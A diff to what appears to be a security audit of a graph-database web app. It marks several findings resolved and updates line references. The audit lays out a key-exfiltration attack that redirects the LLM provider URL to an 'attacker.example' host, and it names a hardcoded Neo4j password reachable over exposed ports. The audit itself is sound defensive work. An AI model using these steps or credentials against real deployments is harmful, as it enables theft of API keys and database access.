@@ -14,19 +14,19 @@ The API surface is 33 path templates / 45 operations (verified from the live `/o
 
 | Anonymous write endpoint | File |
 |---|---|
-| `POST /api/series/{id}/notes`, `PATCH`/`DELETE /notes/{note_id}` | `api/user_content.py:46,94,110` |
+| `POST /api/series/{id}/notes`, `PATCH`/`DELETE /notes/{note_id}` | `api/user_content.py:52,103,120` |
 | `POST/PATCH/DELETE /custom-nodes`, `/custom-relationships` (6 routes) | `api/user_content.py:124-201` |
-| `POST /candidates/ingest` | `api/candidates.py:79` |
-| `POST /candidates/{id}/approve`, `/reject`, `PATCH /candidates/{id}` | `api/candidates.py:163,219,269` |
-| `POST /revisions/{revision_id}/revert` | `api/revisions.py:119` |
+| `POST /candidates/ingest` | `api/candidates.py:107` |
+| `POST /candidates/{id}/approve`, `/reject`, `PATCH /candidates/{id}` | `api/candidates.py:175,231,285` |
+| `POST /revisions/{revision_id}/revert` | `api/revisions.py:125` |
 
 No `CurrentUserDependency` anywhere in `user_content.py`, `candidates.py`, or the revert route. The frontend never gates on auth either — `useAuth` is imported only in `App.tsx` and `LoginPage.tsx`; `DetailPanel`, the notes tab, and the custom-content dialogs render for anonymous visitors. **Fix:** put every mutation behind `require_current_user` and bind records to `user["id"]`.
 
 ### 2. Any anonymous visitor can promote claims to canonical — graph poisoning
-`POST /api/series/{series_id}/candidates/{claim_id}/approve` (`candidates.py:163-213`) flips `status = 'canonical'` on any claim with `origin: 'candidate'` and logs a revision. Combined with anonymous `ingest` (`candidates.py:79`), a stranger can: inject arbitrary claims → approve them → **permanently alter the canonical knowledge graph every visitor sees**. The "candidate review workflow" the README advertises has no reviewer — the door is unlocked. **Fix:** admin/owner gate; candidates must never be writable anonymously.
+`POST /api/series/{series_id}/candidates/{claim_id}/approve` (`candidates.py:175-213`) flips `status = 'canonical'` on any claim with `origin: 'candidate'` and logs a revision. Combined with anonymous `ingest` (`candidates.py:107`), a stranger can: inject arbitrary claims → approve them → **permanently alter the canonical knowledge graph every visitor sees**. The "candidate review workflow" the README advertises has no reviewer — the door is unlocked. **Fix:** admin/owner gate; candidates must never be writable anonymously.
 
 ### 3. Anonymous revert can overwrite any resource state
-`POST /api/series/{id}/revisions/{revision_id}/revert` (`revisions.py:119`) restores a `before` snapshot onto live nodes. It is unauthenticated. Anyone can roll back (or restore) any revisioned resource — including user content and candidate state — without permission. **Fix:** auth + ownership check on the target resource.
+`POST /api/series/{id}/revisions/{revision_id}/revert` (`revisions.py:125`) restores a `before` snapshot onto live nodes. It is unauthenticated. Anyone can roll back (or restore) any revisioned resource — including user content and candidate state — without permission. **Fix:** auth + ownership check on the target resource.
 
 ### 4. User content has no owner — everyone can edit and delete everyone else's data
 `NoteResponse` (`domain/user_content.py:131`) has **no `user_id` field**. Notes, custom nodes, and custom relationships are global. `update_note`/`delete_note` match by id only. The docs admit it: `ARCHITECTURE.md:282` — "these routes do not bind an authenticated owner ID, so content is not isolated per user"; `ARCHITECTURE.md:672` — "current user-content records are not bound to an `AppUser` owner ID". On a public site this is vandalism + data-loss-as-a-service. **Fix:** owner binding, owner-only mutations, per-user reads.
@@ -39,12 +39,18 @@ No `CurrentUserDependency` anywhere in `user_content.py`, `candidates.py`, or th
 Attack: sign in → PUT `{provider: "openai_compatible", base_url: "https://attacker.example", model: "x", enabled: true}` → send a chat message → the backend sends the stored key as `Authorization: Bearer <key>` (`llm/provider.py:132`) or `x-goog-api-key` (`provider.py:369`) **to the attacker's host**. One request, key gone. The `http`/`https` scheme allowlist (`settings.py:30`) deliberately allows SSRF into internal hosts too. The key is also stored **plaintext** in Neo4j. **Fix:** admin-gated settings, per-user provider config, key at-rest encryption, allowlist of provider hosts.
 
 ### 6. No rate limiting, no LLM budget, no abuse protection — the operator pays for everyone
+**RESOLVED** — verified fixed as of 2026-08-04: `backend/app/services/rate_limit.py` now implements a Redis-backed rate limiter (`pyrate_limiter`, atomic `RedisBucket`) wired into `api/auth.py` (login), `api/chat.py` (chat-send), and `api/user_content.py` (content-write, every mutation route) — see commit `1f8a3e9`. The `grep` below and the original zero-hits finding no longer reflect current code; this is left in place for the audit trail.
+
 `grep -rni "rate.limit|slowapi|throttle"` across backend/frontend: **zero hits**. The only guard is a per-user in-memory generation slot (`services/chat.py:48-71`) — one concurrent LLM stream per user, in a process-local dict. There is no daily cap, no token budget, no per-user cost ceiling, no general request limiter. Anyone with a free Google account can stream `max_length=4000`-char questions (`domain/chat.py:82`) through up to 4 tool rounds × 40 context items × 800 output tokens per call, unbounded, and the owner's API bill grows. Also: the in-memory slot breaks under `uvicorn --workers N` (each worker gets its own slot → limit silently multiplied). **Fix:** real rate limiting + per-user budget + Redis/DB-backed slots.
 
 ### 7. The Google-bypass backdoor is armed in this deployment's environment
+**RESOLVED** — verified fixed as of 2026-08-04: `grep -rni "dev_auth|AUTH_DEV_CODE|/auth/dev"` across `backend/app` returns **zero matches** — the `POST /api/auth/dev` route and the dev-login code path no longer exist (removed in commit `e093f81`, already documented under finding #55's fact-check correction). The `AUTH_DEV_CODE` variable, if still present in a local `.env`, is dead config with no route to consume it. This finding is left in place for the audit trail; the description below reflects the state before the removal.
+
 The live root `.env` defines **`AUTH_DEV_CODE`** (verified: key names `GOOGLE_CLIENT_ID`, `AUTH_DEV_CODE`). `POST /api/auth/dev` (`api/auth.py:206`) then lets anyone who knows the code sign in as the fixed `dev-local` identity and do everything a user can do — including the settings exfiltration in #5. The route is documented "Never enable in production"; a copied `.env` is the classic way it ships. **Fix:** delete the variable, or gate the route on a debug flag that fails closed when not in debug.
 
 ### 8. Session cookie defaults to insecure, and the example config ships insecure
+**RESOLVED** — verified fixed as of 2026-08-04: `core/config.py:34` now defines `session_cookie_secure` with `default=True`, and `.env.example:10` is `SESSION_COOKIE_SECURE=true`. The cookie is Secure-by-default in production; local HTTP dev must explicitly opt out. This finding is left in place for the audit trail; the description below reflects the state before the fix.
+
 `SESSION_COOKIE_SECURE=false` is the default (`core/config.py:26-29`) **and** the value in `.env.example:10`. On any HTTP deployment the session cookie travels plaintext — session hijack with one packet capture. The cookie is the ONLY credential. **Fix:** default `true`, fail deployment on false outside localhost, HSTS on the host.
 
 ### 9. Sessions are never cleaned — unbounded DB growth and a write on every request
@@ -122,6 +128,8 @@ That is the roadmap **openly deferring the #1-#5 findings in this document** to 
 `docs/DEPLOYMENT.md` states it plainly: no backend/frontend Dockerfiles, no CI/CD, no production target. Verified: **no `.github/` directory exists** in the repo. The GitHub Pages commit (`273221e`) deploys the static landing page only. What's missing for a public launch: app container images, reverse proxy/TLS termination, CI pipeline, env/secret management, log aggregation, monitoring/alerting, backups of Neo4j, and a documented multi-user operations model. "Polished vertical prototype" is accurate; "deployable" is not.
 
 ### 27. Docker Compose hardcodes credentials; `.env.example` ships different ones
+**RESOLVED** — verified fixed as of 2026-08-04: `docker-compose.yml:12` is `NEO4J_AUTH: neo4j/${NEO4J_PASSWORD:-change-me}` — env-var driven, not hardcoded, and it now shares the same `NEO4J_PASSWORD` variable and `change-me` fallback as `.env.example`. There is no longer a two-password mismatch. This finding is left in place for the audit trail; the description below reflects the state before the fix.
+
 `docker-compose.yml:12` hardcodes `NEO4J_AUTH: neo4j/hdgraf-local-password`. `.env.example:3` ships `NEO4J_PASSWORD=change-me`. Two files, two passwords, one silent misconfiguration for anyone who copies `.env.example` (the documented startup path in DEPLOYMENT.md) and starts Compose. **Fix:** single source of truth, `.env`-driven, `change-me` rejected by the backend on startup outside dev.
 
 ### 28. No LICENSE, no CONTRIBUTING, and seed data hotlinks third-party images
@@ -145,6 +153,8 @@ No `LICENSE` or `CONTRIBUTING.md` in the repo (verified). `data/dexter/seed/char
 The first pass covered the API surface, suites, and docs. This pass walked the DB layer, auth internals, chat pipeline, revisions, and the deployment recipe. Ten more blockers, verified against source.
 
 ### 31. CRITICAL — the only deployment recipe exposes the Neo4j database itself to the internet
+**RESOLVED** — verified fixed as of 2026-08-04: `docker-compose.yml` now binds both ports to `127.0.0.1` only (lines 7-9: `"127.0.0.1:7474:7474"`, `"127.0.0.1:7687:7687"`), uses an env-driven credential (`NEO4J_AUTH: neo4j/${NEO4J_PASSWORD:-change-me}`, line 12) instead of a hardcoded password, and pins the image to `neo4j:2026.06.0-community` (line 3) instead of a floating tag. Neo4j is no longer reachable from any interface but localhost with this recipe. This finding is left in place for the audit trail; the description below reflects the state before the fix.
+
 `docker-compose.yml` — the ONLY database deployment artifact in the repo — publishes **`7474:7474` and `7687:7687` to every interface** with a **hardcoded credential** (`NEO4J_AUTH: neo4j/hdgraf-local-password`, line 12) and a **floating `neo4j:2026-community` tag** (no version pin). Anyone who finds the host can `bolt://<host>:7687` straight in with the known password and read/write the entire graph — user PII, session tokens, the plaintext LLM API key in `:AppSetting` — completely bypassing the application, its auth, and its spoiler filtering. There is no Neo4j TLS configuration anywhere. Deploying this recipe as-is is an instant full database dump. **Fix:** do not publish DB ports (backend-only network), force a strong password at startup, pin the image tag, enable DB TLS, and firewall the port.
 
 ### 32. Auth session id collision — two logins in the same second = constraint error
